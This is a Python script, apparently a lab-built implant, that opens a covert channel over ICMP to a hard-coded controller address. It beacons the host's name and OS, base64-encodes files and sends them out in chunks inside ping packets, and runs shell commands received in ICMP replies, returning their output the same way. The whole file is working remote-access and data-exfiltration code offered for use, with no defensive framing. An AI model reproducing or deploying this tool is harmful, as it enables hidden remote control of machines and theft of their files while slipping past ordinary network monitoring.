#!/usr/bin/env python3
import sys
import time
import base64
import os
import subprocess
import threading
import platform

# Add Npcap to PATH for Windows
if os.name == 'nt':
    os.environ['PATH'] += os.pathsep + r"C:\Windows\System32\Npcap"

from scapy.config import conf
# conf.use_pcap = False
from scapy.all import sniff, send, IP, ICMP

CONTROLLER_IP = "172.23.30.36"  # WSL controller IP
MAGIC_BYTES = "EXFIL"
BEACON_INTERVAL = 30
ID = str(time.time())

def send_icmp(msg_type, data):
    payload = f"{MAGIC_BYTES}{msg_type}".encode() + data
    pkt = IP(dst=CONTROLLER_IP)/ICMP(type=8, id=1000)/payload
    print(f"[DEBUG] Sending ICMP to {CONTROLLER_IP}, type={msg_type}, payload_len={len(payload)}")
    send(pkt, verbose=0)
    print(f"[DEBUG] Packet sent")

def beacon():
    while True:
        info = f"{platform.node()}|{platform.system()}"
        encoded = base64.b64encode(info.encode())
        send_icmp('B', encoded)
        time.sleep(BEACON_INTERVAL)

def exfiltrate(filepath):
    try:
        with open(filepath, 'rb') as f:
            content = f.read()
            encoded = base64.b64encode(content)
            
            # Chunking
            chunk_size = 1000
            total_chunks = (len(encoded) + chunk_size - 1) // chunk_size
            file_id = str(int(time.time()))
            
            print(f"[*] Exfiltrating {filepath}...")
            
            for i in range(total_chunks):
                chunk = encoded[i*chunk_size : (i+1)*chunk_size]
                # FILE_ID|CHUNK_NUM|TOTAL_CHUNKS|FILENAME|CONTENT
                payload = f"{file_id}|{i+1}|{total_chunks}|{os.path.basename(filepath)}|".encode() + chunk
                send_icmp('D', payload)
                time.sleep(0.1)
            
            print("[+] Done")
    except Exception as e:
        print(f"[-] Error: {e}")

def handle_packet(pkt):
    if ICMP in pkt and pkt[ICMP].type == 0 and pkt[IP].src == CONTROLLER_IP:
        payload = bytes(pkt[ICMP].payload)
        print(f"[DEBUG] Received ICMP reply, payload length: {len(payload)}")
        if MAGIC_BYTES.encode() in payload:
            print(f"[DEBUG] Magic bytes found!")
            try:
                # MAGIC|C|CMD_B64
                content = payload.split(MAGIC_BYTES.encode())[1]
                msg_type = chr(content[0])
                print(f"[DEBUG] Message type: {msg_type}")
                if msg_type == 'C':
                    cmd_b64 = content[1:]
                    cmd = base64.b64decode(cmd_b64).decode()
                    print(f"[*] Executing: {cmd}")
                    
                    output = subprocess.getoutput(cmd)
                    print(f"[DEBUG] Output length: {len(output)} bytes")
                    print(f"[DEBUG] Output: {output[:200]}")
                    
                    response_data = base64.b64encode(output.encode())
                    print(f"[DEBUG] Sending response, encoded length: {len(response_data)}")
                    send_icmp('R', response_data)
                    print(f"[DEBUG] Response sent!")
            except Exception as e:
                print(f"[ERROR] Exception in handle_packet: {e}")
                import traceback
                traceback.print_exc()

def get_ip():
    try:
        # Get IP of eth0
        return subprocess.getoutput("ip -4 addr show eth0 | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}'").strip()
    except:
        return None

MY_IP = get_ip()
print(f"[*] Agent IP: {MY_IP}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        exfiltrate(sys.argv[1])
    else:
        # Start command listener
        t = threading.Thread(target=beacon)
        t.daemon = True
        t.start()
        
        print("[*] Listening for commands...")
        # Only accept packets destined for ME and from CONTROLLER
        filter_str = f"icmp and src {CONTROLLER_IP}"
        if MY_IP:
            filter_str += f" and dst {MY_IP}"
            
        print(f"[*] Sniff filter: {filter_str}")
        sniff(filter=filter_str, prn=handle_packet, store=0)
